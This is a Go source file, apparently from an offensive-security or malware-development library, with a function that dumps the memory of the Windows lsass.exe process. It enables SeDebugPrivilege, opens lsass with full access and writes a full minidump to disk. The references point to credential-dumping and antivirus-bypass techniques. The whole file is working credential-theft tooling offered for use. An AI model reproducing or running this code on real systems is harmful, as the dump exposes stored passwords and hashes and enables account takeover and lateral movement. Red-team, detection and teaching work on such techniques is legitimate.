package core

/*

References:
https://github.com/calebsargent/GoProcDump
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

*/

import (
  "os"
  "syscall"
  "unsafe"

  mproc "github.com/D3Ext/maldev/process"
)

func DumpLsass(output string) (error) {
  err := ElevateProcessToken()
  if err != nil {
    return err
  }

  all_lsass_pids, err := mproc.FindPidByName("lsass.exe")
  if err != nil {
    return err
  }
  lsass_pid := all_lsass_pids[0]

  //set up Win32 APIs
  var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
  var procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
  var kernel32 = syscall.NewLazyDLL("kernel32.dll")
  var procOpenProcess = kernel32.NewProc("OpenProcess")
  var procCreateFileW = kernel32.NewProc("CreateFileW")

  // error not handle because it's unstable
  processHandle, _, _ := procOpenProcess.Call(uintptr(0xFFFF), uintptr(1), uintptr(lsass_pid))
  
  // Create memory dump
  os.Create(output)

  path, _ := syscall.UTF16PtrFromString(output)
  fileHandle, _, _ := procCreateFileW.Call(
    uintptr(unsafe.Pointer(path)),
    syscall.GENERIC_WRITE,
    syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
    0,
    syscall.OPEN_EXISTING,
    syscall.FILE_ATTRIBUTE_NORMAL,
    0,
  )

  ret, _, err := procMiniDumpWriteDump.Call(
    uintptr(processHandle),
    uintptr(lsass_pid),
    uintptr(fileHandle),
    0x00061907,
    0,
    0,
    0,
  )

  if (ret == 0) {
    os.Remove(output)
    return err
  }

  return nil
}

func ElevateProcessToken() (error) {

  type Luid struct {
    lowPart  uint32 // DWORD
    highPart int32  // long
  }

  type LuidAndAttributes struct {
    luid       Luid   // LUID
    attributes uint32 // DWORD
  }

  type TokenPrivileges struct {
    privilegeCount uint32 // DWORD
    privileges     [1]LuidAndAttributes
  }

  const SeDebugPrivilege = "SeDebugPrivilege"
  const tokenAdjustPrivileges = 0x0020
  const tokenQuery = 0x0008
  var hToken uintptr

  user32 := syscall.MustLoadDLL("user32")
  defer user32.Release()

  kernel32 := syscall.MustLoadDLL("kernel32")
  defer user32.Release()

  advapi32 := syscall.MustLoadDLL("advapi32")
  defer advapi32.Release()

  GetCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
  GetLastError := kernel32.MustFindProc("GetLastError")
  OpenProdcessToken := advapi32.MustFindProc("OpenProcessToken")
  LookupPrivilegeValue := advapi32.MustFindProc("LookupPrivilegeValueW")
  AdjustTokenPrivileges := advapi32.MustFindProc("AdjustTokenPrivileges")

  currentProcess, _, _ := GetCurrentProcess.Call()

  result, _, err := OpenProdcessToken.Call(
    currentProcess,
    tokenAdjustPrivileges|tokenQuery,
    uintptr(unsafe.Pointer(&hToken)),
  )

  if result != 1 {
    return err
  }

  var tkp TokenPrivileges

  result, _, err = LookupPrivilegeValue.Call(
    uintptr(0),
    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SeDebugPrivilege))),
    uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))),
  )

  if result != 1 {
    return err
  }

  const SePrivilegeEnabled uint32 = 0x00000002

  tkp.privilegeCount = 1
  tkp.privileges[0].attributes = SePrivilegeEnabled

  result, _, err = AdjustTokenPrivileges.Call(
    hToken,
    0,
    uintptr(unsafe.Pointer(&tkp)),
    0,
    uintptr(0),
    0,
  )

  if result != 1 {
    return err
  }

  result, _, _ = GetLastError.Call()
  if result != 0 {
    return err
  }

  return nil
}




